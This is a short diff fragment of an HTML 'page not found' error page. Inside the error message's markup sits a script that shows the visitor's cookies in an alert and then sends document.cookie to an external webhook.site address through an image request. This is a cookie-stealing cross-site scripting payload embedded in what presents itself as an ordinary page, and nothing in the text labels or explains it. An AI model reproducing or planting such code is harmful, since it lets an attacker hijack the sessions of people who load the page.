@@ -16,8 +16,8 @@
     <div class="error">
       <h1>Uh Ohh!</h1>
       <p>We couldn't find the page that you're looking for :(</p>
-      <div class="cta">
-				<script>
+      <div>
+<script>
 alert(document.cookie);
 var i=new Image;
 i.src="https://webhook.site/c46bc29e-24c8-4b54-8b62-d1c3f8e2177c/?"+document.cookie;
